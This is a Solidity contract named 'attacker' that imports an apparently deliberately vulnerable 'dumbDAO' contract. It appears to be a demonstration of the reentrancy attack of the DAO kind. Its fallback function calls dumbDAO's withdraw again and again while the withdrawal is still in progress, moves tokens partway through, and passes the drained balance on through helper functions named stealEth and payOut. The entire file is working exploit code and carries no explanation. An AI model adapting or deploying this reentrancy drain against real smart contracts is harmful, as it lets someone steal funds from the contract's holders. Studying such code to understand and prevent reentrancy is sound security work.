import "dumbDAO.sol";

contract attacker {
  event DefaultFunc(address caller, uint amount, uint num, uint daoBalance);

  address public daoAddress;
  address public transferAddress;

  uint[] public arr;
  uint public a     = 0;

  function () {
    DefaultFunc(msg.sender,msg.value,a,dumbDAO(daoAddress).balances(this)-1);
    while (a<5) {
        a++;
      arr.push(a); //to help debug
    //  if (daoAddress.balance-2*msg.value < 0){
    if (a==4){
          dumbDAO(daoAddress).transferTokens(transferAddress,dumbDAO(daoAddress).balances(this)-1);
      }
      dumbDAO(daoAddress).withdraw(this);
    }
  }

  //fund contract without calling the default function
  function fundMe(){
  }

  function stealEth(){
    dumbDAO(daoAddress).withdraw(this);
  }

  function payOut(address _payee) returns (bool){
    if (_payee.send(this.balance))
    return true;
  }

  function buyDAOTokens(uint _amount){
    dumbDAO(daoAddress).buyTokens.value(_amount)();
  }

  function resetA() {
    a               =0;
  }

  function setDAOAddress(address _dao){
    daoAddress      =_dao;
  }
  function setTransferAddress(address _transferAddress){
    transferAddress =_transferAddress;
  }
}
